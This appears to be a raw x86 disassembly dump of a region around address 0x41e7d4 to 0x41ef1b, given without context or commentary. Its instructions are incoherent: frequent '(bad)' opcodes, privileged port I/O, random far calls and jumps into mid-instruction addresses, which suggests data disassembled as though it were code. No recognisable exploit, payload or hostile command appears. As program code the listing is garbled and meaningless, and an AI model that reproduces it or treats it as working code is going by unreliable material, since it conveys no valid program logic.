  41e7d4:	int3   
  41e7d5:	ss int3 
  41e7d7:	push   0x73386fce
  41e7dc:	mov    eax,0x1d817474
  41e7e1:	in     eax,dx
  41e7e2:	lock fimul WORD PTR [ecx-0x6b]
  41e7e6:	sub    eax,0xf46c7e23
  41e7eb:	loop   0x41e788
  41e7ed:	ja     0x41e79b
  41e7ef:	out    0x85,eax
  41e7f1:	or     eax,0xbf7218c9
  41e7f6:	(bad)  
  41e7f7:	call   DWORD PTR [ebx-0x10]
  41e7fa:	pop    edi
  41e7fb:	jp     0x41e7ab
  41e7fd:	inc    edx
  41e7fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e800:	call   edi
  41e802:	and    BYTE PTR [ecx],bh
  41e804:	add    esi,DWORD PTR [edx-0x77e0e16b]
  41e80a:	out    0x75,al
  41e80c:	and    ch,BYTE PTR [esi]
  41e80e:	aad    0xcc
  41e810:	mov    si,0xe307
  41e814:	daa    
  41e815:	call   0x40b6:0xd61b8637
  41e81c:	mov    ebp,0x4bcb1989
  41e821:	xor    DWORD PTR [esp+ecx*8-0x7f06c903],0xf990472b
  41e82c:	mov    ch,0x11
  41e82e:	sbb    DWORD PTR [ecx],ecx
  41e830:	pop    es
  41e831:	data16 mov bl,0x78
  41e834:	pop    ds
  41e835:	add    eax,0xf2e5b07e
  41e83a:	and    al,0xa0
  41e83c:	sti    
  41e83d:	cmp    eax,0xaf1a7496
  41e842:	xchg   esi,eax
  41e843:	or     al,0xb6
  41e845:	fadd   st(1),st
  41e847:	js     0x41e7d5
  41e849:	dec    esi
  41e84a:	pop    es
  41e84b:	ret    
  41e84c:	or     al,BYTE PTR [edx-0x3]
  41e84f:	cmp    bh,dh
  41e851:	das    
  41e852:	sub    bh,BYTE PTR [eax+eax*1-0x18fa9249]
  41e859:	int    0x71
  41e85b:	pop    edx
  41e85c:	jg     0x41e848
  41e85e:	cdq    
  41e85f:	push   ebx
  41e860:	ret    
  41e861:	jbe    0x41e825
  41e863:	popf   
  41e864:	dec    ebx
  41e865:	shl    DWORD PTR ds:[edi-0x74],0x58
  41e86a:	(bad)  
  41e86b:	mov    eax,0x88b92517
  41e870:	sti    
  41e871:	arpl   sp,si
  41e873:	pop    ebp
  41e874:	pop    ebx
  41e875:	xor    BYTE PTR [eax],ah
  41e877:	mov    ecx,0xa5f5b395
  41e87c:	gs pusha 
  41e87e:	mov    bl,0x3b
  41e880:	add    eax,0x6e3be6ab
  41e885:	retf   
  41e886:	xor    DWORD PTR [ebx],ebp
  41e888:	pop    ds
  41e889:	jecxz  0x41e835
  41e88b:	lods   al,BYTE PTR ds:[esi]
  41e88c:	jno    0x41e8d8
  41e88e:	dec    esp
  41e88f:	mov    ?,WORD PTR [edx-0x55a3ec9e]
  41e895:	jne    0x41e8c6
  41e897:	pop    ss
  41e898:	pop    esp
  41e899:	pop    edx
  41e89a:	loop   0x41e8ab
  41e89c:	inc    edx
  41e89d:	or     DWORD PTR [esi+0xb69a6c],edx
  41e8a3:	gs std 
  41e8a5:	jmp    0x23b0c95f
  41e8aa:	push   DWORD PTR [esi]
  41e8ac:	mov    edx,0x493af7ec
  41e8b1:	cmp    cl,ah
  41e8b3:	ja     0x41e867
  41e8b5:	(bad)  
  41e8b6:	rcr    BYTE PTR [edx],cl
  41e8b8:	push   ebx
  41e8b9:	loope  0x41e873
  41e8bb:	scas   al,BYTE PTR es:[edi]
  41e8bc:	ins    DWORD PTR es:[edi],dx
  41e8bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8be:	push   0x2
  41e8c0:	and    al,0xdc
  41e8c2:	xchg   DWORD PTR [esi+0x2f2515b8],edi
  41e8c8:	add    BYTE PTR [esi+0xd],bh
  41e8cb:	inc    ebx
  41e8cc:	mov    WORD PTR [ebx+0x12581c41],?
  41e8d2:	dec    ebx
  41e8d3:	and    BYTE PTR [esi],bh
  41e8d5:	xor    BYTE PTR [edi],ch
  41e8d7:	mov    ecx,DWORD PTR [edi-0x6116aec]
  41e8dd:	lahf   
  41e8de:	mov    dh,0x5f
  41e8e0:	xchg   ebp,eax
  41e8e1:	xor    BYTE PTR [eax-0x3cc24c82],0x4c
  41e8e8:	(bad)  
  41e8e9:	xchg   ecx,eax
  41e8ea:	gs (bad) 
  41e8ec:	xchg   esp,eax
  41e8ed:	or     BYTE PTR [eax-0x7e71a497],dh
  41e8f3:	jmp    0x41e880
  41e8f5:	sub    eax,0x8e11884a
  41e8fa:	add    esp,DWORD PTR [edx+0x6a]
  41e8fd:	mov    esi,0xc1f9e4cd
  41e902:	ret    0xfe0
  41e905:	push   ebx
  41e906:	(bad)  
  41e907:	cmp    eax,0xa1c17a78
  41e90c:	lahf   
  41e90d:	jne    0x41e978
  41e90f:	push   cs
  41e910:	adc    dl,dl
  41e912:	fdivr  DWORD PTR [eax]
  41e914:	ficom  WORD PTR [edi-0x4e]
  41e917:	das    
  41e918:	xor    al,0xd8
  41e91a:	xor    eax,0x32fe3de4
  41e91f:	xor    edi,DWORD PTR [eax-0x50b3f7f4]
  41e925:	sub    esp,ebx
  41e927:	sbb    al,0xf
  41e929:	or     eax,0x67fcbe2f
  41e92e:	cli    
  41e92f:	add    DWORD PTR [edi],0x8d28c0a7
  41e935:	test   DWORD PTR [eax-0x35a9421c],esi
  41e93b:	popf   
  41e93c:	and    DWORD PTR [ecx-0x339875b6],0x57
  41e943:	inc    ebx
  41e944:	dec    ebp
  41e945:	cld    
  41e946:	jge    0x41e910
  41e948:	das    
  41e949:	daa    
  41e94a:	inc    edx
  41e94b:	xchg   edi,eax
  41e94c:	jle    0x41e997
  41e94e:	es sbb al,0x6d
  41e951:	imul   edi,edx,0xffffff97
  41e954:	and    edx,DWORD PTR [esi]
  41e956:	jb     0x41e9d2
  41e958:	or     bh,BYTE PTR [ecx]
  41e95a:	push   edx
  41e95b:	mov    edi,0x6db8851a
  41e960:	ret    0x1f88
  41e963:	iret   
  41e964:	out    dx,eax
  41e965:	aam    0x23
  41e967:	(bad)  
  41e968:	addr16 xor esi,esi
  41e96b:	lods   al,BYTE PTR ds:[esi]
  41e96c:	je     0x41e932
  41e96e:	rcl    DWORD PTR [esi-0x361311c6],1
  41e974:	imul   DWORD PTR [ecx-0xf27002]
  41e97a:	cmc    
  41e97b:	mov    bl,0x3
  41e97d:	mov    edx,0x4394aab4
  41e982:	std    
  41e983:	jle    0x41e9be
  41e985:	xchg   esi,eax
  41e986:	sub    DWORD PTR [ebx+0x9ea9cbb],esp
  41e98c:	div    esp
  41e98e:	sbb    BYTE PTR [ecx],0x50
  41e991:	ret    0x1200
  41e994:	mov    esp,0x558afbb0
  41e999:	nop
  41e99a:	ss sahf 
  41e99c:	call   0xd28f:0x275ed4e5
  41e9a3:	jbe    0x41e961
  41e9a5:	inc    esi
  41e9a6:	pop    esp
  41e9a7:	leave  
  41e9a8:	shl    BYTE PTR [edx],cl
  41e9aa:	mov    al,ds:0x779144
  41e9af:	jno    0x41e983
  41e9b1:	add    eax,0xb0924813
  41e9b6:	in     eax,dx
  41e9b7:	mov    WORD PTR [edx-0x30],?
  41e9ba:	in     al,dx
  41e9bb:	out    0x92,al
  41e9bd:	stos   DWORD PTR es:[edi],eax
  41e9be:	xchg   esp,eax
  41e9bf:	clc    
  41e9c0:	outs   dx,BYTE PTR ds:[esi]
  41e9c1:	mov    dh,0x59
  41e9c3:	cwde   
  41e9c4:	and    edi,DWORD PTR [edx]
  41e9c6:	xor    BYTE PTR [ebx],0x28
  41e9c9:	inc    esi
  41e9ca:	fimul  DWORD PTR [edx-0x32084934]
  41e9d0:	aam    0x42
  41e9d2:	pop    ds
  41e9d3:	adc    ebp,esp
  41e9d5:	xor    eax,0x9dae86b4
  41e9da:	jo     0x41ea2b
  41e9dc:	mov    esp,0x27f747c2
  41e9e1:	ret    0x72ae
  41e9e4:	(bad)  
  41e9e5:	imul   edx,DWORD PTR [ecx],0x14
  41e9e8:	and    al,0x7a
  41e9ea:	in     al,0x65
  41e9ec:	pop    ebp
  41e9ed:	xor    eax,0x2259eb43
  41e9f2:	fcmovne st,st(6)
  41e9f4:	and    BYTE PTR [esi],0xfb
  41e9f7:	push   ds
  41e9f8:	stos   DWORD PTR es:[edi],eax
  41e9f9:	jecxz  0x41ea51
  41e9fb:	jns    0x41ea14
  41e9fd:	test   DWORD PTR [ecx],eax
  41e9ff:	sub    al,0x99
  41ea01:	aas    
  41ea02:	push   ds
  41ea03:	aaa    
  41ea04:	jnp    0x41ea65
  41ea06:	lods   eax,DWORD PTR ds:[esi]
  41ea07:	sbb    al,0x2a
  41ea09:	jb     0x41ea55
  41ea0b:	push   eax
  41ea0c:	sbb    al,0xa3
  41ea0e:	xchg   edi,eax
  41ea0f:	mov    ds:0xd4e1704d,al
  41ea14:	lods   eax,DWORD PTR ds:[esi]
  41ea15:	out    dx,eax
  41ea16:	lea    ebx,gs:[esi+0x51078358]
  41ea1d:	xchg   cl,ch
  41ea1f:	fadd   QWORD PTR [ecx+0x4b91c6b2]
  41ea25:	or     eax,0xe6cd1673
  41ea2a:	ficom  DWORD PTR [ebp-0x25]
  41ea2d:	sub    BYTE PTR [esi-0x2e],dh
  41ea30:	cdq    
  41ea31:	ss out 0xa4,al
  41ea34:	jnp    0x41e9e2
  41ea36:	stos   BYTE PTR es:[edi],al
  41ea37:	nop
  41ea38:	stos   BYTE PTR es:[edi],al
  41ea39:	out    dx,al
  41ea3a:	retf   0x764c
  41ea3d:	int    0x5e
  41ea3f:	(bad)  
  41ea41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea42:	aam    0xd0
  41ea44:	sub    al,0xd6
  41ea46:	inc    esi
  41ea47:	ret    
  41ea48:	fs in  eax,dx
  41ea4a:	inc    esp
  41ea4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea4c:	sbb    al,0x53
  41ea4e:	jno    0x41e9d8
  41ea50:	repnz xor eax,0x5c1cd5ab
  41ea56:	aad    0xa6
  41ea58:	sub    BYTE PTR [ecx+0x11],bl
  41ea5b:	push   eax
  41ea5c:	mov    BYTE PTR [eax+0x404c71],dh
  41ea62:	inc    ecx
  41ea63:	loop   0x41ea7b
  41ea65:	ret    
  41ea66:	js     0x41ea9e
  41ea68:	ret    
  41ea69:	into   
  41ea6a:	gs icebp 
  41ea6c:	fwait
  41ea6d:	imul   ebp,DWORD PTR [ecx+0x2c44b9c1],0xffffffe7
  41ea74:	stc    
  41ea75:	lea    esi,[ebx+0x6e]
  41ea78:	mov    esp,0x8b99b29a
  41ea7d:	and    DWORD PTR [ecx],0xffffffba
  41ea80:	stos   DWORD PTR es:[edi],eax
  41ea81:	loop   0x41eafe
  41ea83:	int    0xab
  41ea85:	add    DWORD PTR [ebx+0x6],eax
  41ea88:	out    dx,eax
  41ea89:	shr    ebp,1
  41ea8b:	aas    
  41ea8c:	das    
  41ea8d:	cdq    
  41ea8e:	inc    eax
  41ea8f:	mov    BYTE PTR [eax-0x49],0x76
  41ea93:	inc    esp
  41ea94:	adc    eax,DWORD PTR [esi]
  41ea96:	in     al,0x2b
  41ea98:	sub    eax,edx
  41ea9a:	fs cwde 
  41ea9c:	sub    ebx,DWORD PTR [ecx-0x2e25690f]
  41eaa2:	xchg   ecx,eax
  41eaa3:	popa   
  41eaa4:	rol    dh,cl
  41eaa6:	dec    esi
  41eaa7:	xor    eax,0x6c349624
  41eaac:	fldl2t 
  41eaae:	(bad)  
  41eaaf:	and    DWORD PTR [ecx],edi
  41eab1:	mov    ds:0xd2d8dcd1,al
  41eab6:	push   esi
  41eab7:	pop    esi
  41eab8:	in     al,0x21
  41eaba:	cmp    BYTE PTR [ecx],al
  41eabc:	cmc    
  41eabd:	mov    dh,0xa3
  41eabf:	mov    esp,0x17062c90
  41eac4:	xchg   ebx,eax
  41eac5:	jnp    0x41eab1
  41eac7:	neg    BYTE PTR [ebx-0x23]
  41eaca:	adc    ebp,ebp
  41eacc:	push   edx
  41eacd:	(bad)  
  41eace:	fdivr  QWORD PTR [ecx+0xe3c9706]
  41ead4:	daa    
  41ead5:	ret    
  41ead6:	dec    ebp
  41ead7:	sbb    DWORD PTR [ebp-0x2c],esi
  41eada:	inc    esp
  41eadb:	sbb    BYTE PTR [ecx],cl
  41eadd:	sti    
  41eade:	bndstx [eax+0x326ac9f2],bnd0
  41eae5:	sbb    BYTE PTR [ebx-0x7b],dh
  41eae8:	or     eax,0x7beeaec4
  41eaed:	mov    al,0x3b
  41eaef:	int3   
  41eaf0:	in     al,0x33
  41eaf2:	mov    esp,DWORD PTR [esi+0x3bc297ba]
  41eaf8:	fimul  DWORD PTR [edi+0x78f1e6a6]
  41eafe:	jp     0x41eadb
  41eb00:	jl     0x41eb57
  41eb02:	pop    eax
  41eb03:	mov    dh,0x78
  41eb05:	cwde   
  41eb06:	in     eax,dx
  41eb07:	push   edi
  41eb08:	push   edx
  41eb09:	jmp    0x3892:0xd4699bd3
  41eb10:	out    0x21,al
  41eb12:	push   ecx
  41eb13:	mov    ah,0xe
  41eb15:	ficomp DWORD PTR [edi+0x6e]
  41eb18:	adc    ebx,ebx
  41eb1a:	aaa    
  41eb1b:	sbb    DWORD PTR [di],eax
  41eb1e:	and    eax,0xc456e14a
  41eb23:	sahf   
  41eb24:	adc    DWORD PTR [ebx+esi*8-0x1c167729],ebx
  41eb2b:	pop    edi
  41eb2c:	adc    eax,0xe01d7ed7
  41eb31:	(bad)  
  41eb32:	call   0x3531:0xd9e3b417
  41eb39:	loopne 0x41eb1b
  41eb3b:	stc    
  41eb3c:	retf   
  41eb3d:	and    esp,edx
  41eb3f:	idiv   BYTE PTR [esi+0x2]
  41eb42:	push   0x9
  41eb44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb45:	icebp  
  41eb46:	sbb    ebx,DWORD PTR [ebp+0x1e1b1a8f]
  41eb4c:	popa   
  41eb4d:	cmp    BYTE PTR [esi-0x2f5fc9e1],cl
  41eb53:	ds push ss
  41eb55:	call   0x2b34adb5
  41eb5a:	repnz mov eax,DWORD PTR [esi]
  41eb5d:	cmp    dl,bl
  41eb5f:	mov    ecx,0xf551f7e5
  41eb64:	addr16 ja 0x41eb1f
  41eb67:	repz rcr DWORD PTR [ebx+0x29],1
  41eb6b:	jns    0x41eba5
  41eb6d:	jp     0x41eb90
  41eb6f:	inc    edi
  41eb70:	(bad)  
  41eb71:	mov    bh,0xd2
  41eb73:	out    dx,al
  41eb74:	adc    eax,0xf72bcf4c
  41eb79:	sub    al,0x85
  41eb7b:	jbe    0x41eb4b
  41eb7d:	loopne 0x41ebbd
  41eb7f:	sti    
  41eb80:	jl     0x41eb57
  41eb82:	out    0xa3,al
  41eb84:	cs mov eax,0x1b2b595d
  41eb8a:	popf   
  41eb8b:	or     eax,0x4cf0084d
  41eb90:	dec    ebp
  41eb91:	dec    esp
  41eb92:	or     bh,dl
  41eb94:	xor    dh,BYTE PTR gs:[eax+eiz*4]
  41eb98:	sbb    al,0x1f
  41eb9a:	mov    ebp,0x67309106
  41eb9f:	mov    ecx,0xc8fafff4
  41eba4:	cmp    esp,DWORD PTR [edx]
  41eba6:	mov    ebx,0x5dff1c4a
  41ebab:	(bad)  
  41ebac:	adc    eax,0xa99bcd3e
  41ebb1:	(bad)  
  41ebb2:	repnz cmp edi,ecx
  41ebb5:	repz inc ebx
  41ebb7:	mov    eax,0x2b4efc18
  41ebbc:	leave  
  41ebbd:	pop    edx
  41ebbe:	cld    
  41ebbf:	cmp    ebp,0x1d2491
  41ebc5:	stc    
  41ebc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebc7:	repz aaa 
  41ebc9:	inc    ebp
  41ebca:	dec    esp
  41ebcb:	dec    ebp
  41ebcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebcd:	jne    0x41ec49
  41ebcf:	jnp    0x41eb97
  41ebd1:	in     eax,0x67
  41ebd3:	call   0x826e:0x93a6070b
  41ebda:	scas   eax,DWORD PTR es:[edi]
  41ebdb:	adc    ah,cl
  41ebdd:	scas   al,BYTE PTR es:[edi]
  41ebde:	imul   ecx,DWORD PTR [esi-0x5a],0xe7599cad
  41ebe5:	mov    esp,DWORD PTR [eax]
  41ebe7:	ret    
  41ebe8:	sub    edx,edx
  41ebea:	mov    cl,BYTE PTR [ecx]
  41ebec:	jne    0x41ebb4
  41ebee:	nop
  41ebef:	call   0xb28353cb
  41ebf4:	push   ebp
  41ebf5:	cwde   
  41ebf6:	cmp    dh,BYTE PTR [edi+0x11]
  41ebf9:	jne    0x41ec02
  41ebfb:	test   al,0xd
  41ebfd:	call   0xfc71e2b4
  41ec02:	cmp    BYTE PTR [ebp+0x218e1857],dh
  41ec08:	in     eax,dx
  41ec09:	push   es
  41ec0a:	(bad)  
  41ec0b:	sbb    ebx,DWORD PTR [ecx-0x40cf9284]
  41ec11:	adc    BYTE PTR [esi+0xb30c81b],0x9c
  41ec18:	mov    ds:0xd2c51b10,al
  41ec1d:	cmp    eax,0x6bc81a9e
  41ec22:	or     ebx,ebp
  41ec24:	stos   BYTE PTR es:[edi],al
  41ec25:	stc    
  41ec26:	mov    dh,0x46
  41ec28:	int3   
  41ec29:	adc    eax,0x659324a9
  41ec2e:	add    BYTE PTR [ecx-0x4d],bh
  41ec31:	cmc    
  41ec32:	ja     0x41ecad
  41ec34:	jbe    0x41ec00
  41ec36:	loopne 0x41ec1a
  41ec38:	ins    DWORD PTR es:[edi],dx
  41ec39:	neg    DWORD PTR [esi+0x59]
  41ec3c:	adc    ecx,DWORD PTR [edx-0x7]
  41ec3f:	bound  eax,QWORD PTR [ecx+0x6c16762a]
  41ec45:	loop   0x41ec31
  41ec47:	sub    BYTE PTR [edi],bh
  41ec49:	cmp    eax,0x67d1a5f5
  41ec4e:	or     al,0xba
  41ec50:	je     0x41ebfb
  41ec52:	aas    
  41ec53:	mov    edx,DWORD PTR [edi+0x640cf320]
  41ec59:	add    al,0xf4
  41ec5b:	in     al,0x94
  41ec5d:	stc    
  41ec5e:	xchg   ebx,eax
  41ec5f:	arpl   sp,sp
  41ec61:	sahf   
  41ec62:	pop    ecx
  41ec63:	mov    ds:0xf101382f,al
  41ec68:	push   edx
  41ec69:	push   DWORD PTR [edi]
  41ec6b:	popa   
  41ec6c:	(bad)  
  41ec6d:	mov    al,ds:0x17f5a561
  41ec72:	add    DWORD PTR [ebx],ecx
  41ec74:	mov    ah,0xd3
  41ec76:	xchg   esi,eax
  41ec77:	sti    
  41ec78:	jbe    0x41ec04
  41ec7a:	jbe    0x41eca5
  41ec7c:	add    esp,DWORD PTR [ebp+0x8]
  41ec7f:	pop    edi
  41ec80:	jp     0x41ec98
  41ec82:	jg     0x41eccc
  41ec84:	ins    DWORD PTR es:[edi],dx
  41ec85:	(bad)  
  41ec86:	fdivp  st(7),st
  41ec88:	popf   
  41ec89:	pop    edi
  41ec8a:	push   eax
  41ec8b:	enter  0xbfb8,0xaa
  41ec8f:	push   ebx
  41ec90:	loopne 0x41eca9
  41ec92:	pop    ebx
  41ec93:	push   es
  41ec94:	cmp    eax,0x701e85c6
  41ec99:	push   eax
  41ec9a:	jp     0x41eca7
  41ec9c:	call   0xa7faa766
  41eca1:	and    BYTE PTR [ecx+0x13],dl
  41eca4:	leave  
  41eca5:	mov    ds:0xd963417d,al
  41ecaa:	sbb    al,0x12
  41ecac:	aam    0xf1
  41ecae:	test   al,0x6e
  41ecb0:	icebp  
  41ecb1:	(bad)  
  41ecb2:	sbb    dh,cl
  41ecb4:	jbe    0x41ec53
  41ecb6:	dec    ebx
  41ecb7:	ror    esp,1
  41ecb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecba:	ror    BYTE PTR [edi-0x32],1
  41ecbd:	pop    edi
  41ecbe:	jmp    0xf72f0624
  41ecc3:	and    eax,0x72e9f713
  41ecc8:	cld    
  41ecc9:	mov    al,ds:0x2872b0ac
  41ecce:	fisttp QWORD PTR [ecx-0x3]
  41ecd1:	sub    ecx,DWORD PTR [edx+0x2b]
  41ecd4:	jp     0x41ece6
  41ecd6:	das    
  41ecd7:	adc    eax,0xe9582633
  41ecdd:	mov    edi,0x98bc6b7b
  41ece2:	outs   dx,BYTE PTR ds:[esi]
  41ece3:	mov    ecx,0xbc72b2b5
  41ece8:	and    DWORD PTR [esi],esp
  41ecea:	loope  0x41ed5c
  41ecec:	sbb    ch,bh
  41ecee:	fldenv [esi-0x46]
  41ecf1:	test   eax,0xf8d53605
  41ecf6:	fwait
  41ecf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecf8:	xchg   ecx,eax
  41ecf9:	test   eax,0x221521b7
  41ecfe:	inc    ebx
  41ecff:	std    
  41ed00:	add    bl,BYTE PTR [edi]
  41ed02:	xchg   ecx,eax
  41ed03:	loop   0x41ed01
  41ed05:	pop    ecx
  41ed06:	retf   
  41ed07:	pop    ebx
  41ed08:	sbb    al,BYTE PTR [ebx-0x5e81e438]
  41ed0e:	pop    ecx
  41ed0f:	test   al,0x69
  41ed11:	dec    di
  41ed13:	inc    eax
  41ed14:	fist   WORD PTR [esi]
  41ed16:	in     al,0xc1
  41ed18:	fisttp WORD PTR [ebp+0x6068ebbb]
  41ed1e:	ret    0x5e94
  41ed21:	sub    al,0xe5
  41ed23:	or     eax,0xfed2e8e1
  41ed28:	xchg   esp,eax
  41ed29:	xor    BYTE PTR [ebp+0x17],bh
  41ed2c:	mul    edi
  41ed2e:	xchg   esi,eax
  41ed2f:	setle  BYTE PTR [ebx+0x46dc9a7a]
  41ed36:	xor    DWORD PTR [esi],ecx
  41ed38:	retf   0x2055
  41ed3b:	test   DWORD PTR [ecx],eax
  41ed3d:	inc    edx
  41ed3e:	arpl   WORD PTR [eax+0x3ba94cf6],di
  41ed44:	xchg   esp,eax
  41ed45:	(bad)  
  41ed46:	aam    0x7e
  41ed48:	mov    edi,0x4fa6ba5f
  41ed4d:	(bad)  
  41ed4e:	and    al,0xef
  41ed50:	xor    eax,0xb49b18cd
  41ed55:	out    0x5e,al
  41ed57:	add    eax,0xd41ab6cc
  41ed5c:	bound  edx,QWORD PTR [eax]
  41ed5e:	mov    al,ds:0xfd07d34
  41ed63:	int    0x57
  41ed65:	push   ebx
  41ed66:	aaa    
  41ed67:	mov    ?,WORD PTR [esi]
  41ed69:	pop    ds
  41ed6a:	iret   
  41ed6b:	jns    0x41edcf
  41ed6d:	mov    esi,0xd27fdf90
  41ed72:	inc    eax
  41ed73:	sbb    BYTE PTR [edx],dl
  41ed75:	push   edi
  41ed76:	pop    ss
  41ed77:	pusha  
  41ed78:	rcl    BYTE PTR [edx-0x642da748],1
  41ed7e:	iret   
  41ed7f:	in     eax,0x18
  41ed81:	stc    
  41ed82:	inc    edx
  41ed83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed84:	jne    0x41edc8
  41ed86:	and    eax,0x262a3151
  41ed8b:	cmp    BYTE PTR [ecx-0x67],0x3e
  41ed8f:	or     al,0xa7
  41ed91:	mov    ebp,ebx
  41ed93:	push   ebx
  41ed94:	jmp    0x237f27af
  41ed99:	ss pop esp
  41ed9b:	xor    bl,BYTE PTR [ebp+0x63]
  41ed9e:	add    BYTE PTR [edi-0x29a028ed],0xd0
  41eda5:	out    dx,eax
  41eda6:	ret    0x475a
  41eda9:	jns    0x41edd1
  41edab:	leave  
  41edac:	int    0x49
  41edae:	add    bh,BYTE PTR [esi-0x3f1f8624]
  41edb4:	outs   dx,DWORD PTR ds:[esi]
  41edb5:	dec    edi
  41edb6:	push   ecx
  41edb7:	mov    ebx,0x7a3ec61b
  41edbc:	pop    esp
  41edbd:	gs sub dl,dh
  41edc0:	ficom  DWORD PTR [edi+0x1f]
  41edc3:	sar    edx,1
  41edc5:	ja     0x41ed9c
  41edc7:	retf   
  41edc8:	outs   dx,BYTE PTR ds:[esi]
  41edc9:	ret    
  41edca:	imul   esi,DWORD PTR [ebp-0x3e],0xffffff89
  41edce:	dec    edx
  41edcf:	inc    eax
  41edd0:	mov    eax,DWORD PTR [edi]
  41edd2:	fmul   DWORD PTR [ecx]
  41edd4:	cwde   
  41edd5:	dec    eax
  41edd6:	in     eax,dx
  41edd7:	and    DWORD PTR [esi-0x63],edx
  41edda:	and    eax,0xca898a58
  41eddf:	rol    BYTE PTR [ebx],1
  41ede1:	call   0x13de:0xb66ad167
  41ede8:	pop    ds
  41ede9:	pop    esi
  41edea:	sbb    al,0xb6
  41edec:	push   ss
  41eded:	xchg   ebx,eax
  41edee:	aam    0xcc
  41edf0:	push   ss
  41edf1:	dec    esp
  41edf2:	sbb    ch,BYTE PTR [edx]
  41edf4:	aas    
  41edf5:	xor    eax,0x99212293
  41edfa:	gs aaa 
  41edfc:	sti    
  41edfd:	push   ds
  41edfe:	stc    
  41edff:	lea    esi,es:[edx-0x16]
  41ee03:	idiv   DWORD PTR [edi+esi*8-0x2]
  41ee07:	test   DWORD PTR ds:0x959fcf72,esp
  41ee0d:	addr16 addr16 adc dl,al
  41ee11:	and    cl,BYTE PTR [ecx]
  41ee13:	mov    dh,0xc8
  41ee15:	inc    edi
  41ee16:	push   esi
  41ee17:	cmp    ebp,DWORD PTR [edx+0x6e08d37a]
  41ee1d:	adc    DWORD PTR [eax],0x1b
  41ee20:	js     0x41ee75
  41ee22:	sub    al,BYTE PTR [esi-0xc1da9b1]
  41ee28:	xor    dh,al
  41ee2a:	int3   
  41ee2b:	mov    bh,0x58
  41ee2d:	loope  0x41edfd
  41ee2f:	add    edi,DWORD PTR [eax+0x1c8b21c2]
  41ee35:	leave  
  41ee36:	fcmovnu st,st(5)
  41ee38:	xor    BYTE PTR [ebx-0x4f3d9a16],0x6
  41ee3f:	adc    eax,0x669c7b46
  41ee44:	xchg   ebp,eax
  41ee45:	jp     0x41ee08
  41ee47:	dec    edx
  41ee48:	lods   eax,DWORD PTR ds:[esi]
  41ee49:	add    eax,edx
  41ee4b:	or     DWORD PTR [esi+0x15],edi
  41ee4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee4f:	mov    al,0x72
  41ee51:	(bad)  
  41ee52:	jno    0x41ee8e
  41ee54:	icebp  
  41ee55:	add    edi,ecx
  41ee57:	push   eax
  41ee58:	xor    al,0x7e
  41ee5a:	test   al,0x6b
  41ee5c:	rol    dl,0x4d
  41ee5f:	sbb    dh,ah
  41ee61:	in     al,0xb0
  41ee63:	icebp  
  41ee64:	ror    esi,cl
  41ee66:	and    ah,cl
  41ee68:	cmp    eax,0xd22e9c83
  41ee6d:	rol    cl,0x36
  41ee70:	pushf  
  41ee71:	test   al,0x27
  41ee73:	test   DWORD PTR [edi],eax
  41ee75:	jo     0x41ee10
  41ee77:	xchg   edi,eax
  41ee78:	pop    ss
  41ee79:	dec    edi
  41ee7a:	or     eax,0xfa29169
  41ee7f:	scas   eax,DWORD PTR es:[edi]
  41ee80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee81:	adc    eax,0x608b21d1
  41ee86:	mov    edi,0xfeb13ae6
  41ee8b:	push   0x582cfa60
  41ee90:	sahf   
  41ee91:	xor    cl,dh
  41ee93:	push   ebp
  41ee94:	or     BYTE PTR [ebp+0x1e270baa],bh
  41ee9a:	call   0x8f31cf71
  41ee9f:	popf   
  41eea0:	out    dx,al
  41eea1:	addr16 dec ebx
  41eea3:	ror    BYTE PTR [esi-0x1ba5310f],1
  41eea9:	loop   0x41ee81
  41eeab:	cmp    ebx,ecx
  41eead:	adc    al,0xf
  41eeaf:	mov    ecx,0x34c3be3
  41eeb4:	xchg   esp,eax
  41eeb5:	jmp    0x41ef1d
  41eeb7:	xchg   esp,eax
  41eeb8:	cmp    al,al
  41eeba:	out    0x9f,eax
  41eebc:	lods   al,BYTE PTR ds:[esi]
  41eebd:	mov    WORD PTR [ebx+0x29],fs
  41eec0:	ins    DWORD PTR es:[edi],dx
  41eec1:	loopne 0x41ef40
  41eec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eec4:	push   eax
  41eec5:	loop   0x41eec1
  41eec7:	popa   
  41eec8:	jmp    FWORD PTR [eax+0x1328f586]
  41eece:	lahf   
  41eecf:	xchg   ebx,eax
  41eed0:	mov    esp,DWORD PTR [ecx+0x6ee826bd]
  41eed6:	inc    esp
  41eed7:	push   ebp
  41eed8:	into   
  41eed9:	sbb    DWORD PTR [esi],ebp
  41eedb:	mov    eax,0x1006b9f6
  41eee0:	inc    ebp
  41eee1:	mov    ch,0x34
  41eee3:	pop    edi
  41eee4:	in     eax,dx
  41eee5:	rcr    BYTE PTR [edx-0xd],1
  41eee8:	dec    ebp
  41eee9:	jae    0x41ef3b
  41eeeb:	dec    edx
  41eeec:	out    0x9f,al
  41eeee:	loope  0x41ef1e
  41eef0:	lods   al,BYTE PTR ds:[esi]
  41eef1:	mov    dl,0x77
  41eef3:	or     al,0x29
  41eef5:	lods   eax,DWORD PTR ds:[esi]
  41eef6:	fbld   TBYTE PTR [ecx-0x2e9f65d7]
  41eefc:	ss lahf 
  41eefe:	or     BYTE PTR [ebx+0x69],0xa9
  41ef02:	jae    0x41ee8e
  41ef04:	jmp    0x41eebb
  41ef06:	lahf   
  41ef07:	popf   
  41ef08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef09:	sti    
  41ef0a:	shl    edx,0xa1
  41ef0d:	xor    ah,dh
  41ef0f:	pop    esi
  41ef10:	sahf   
  41ef11:	out    0x7b,al
  41ef13:	pop    esp
  41ef14:	mov    al,ds:0x894de296
  41ef19:	jge    0x41eea3
  41ef1b:	stos   DWORD PTR es:[edi],eax
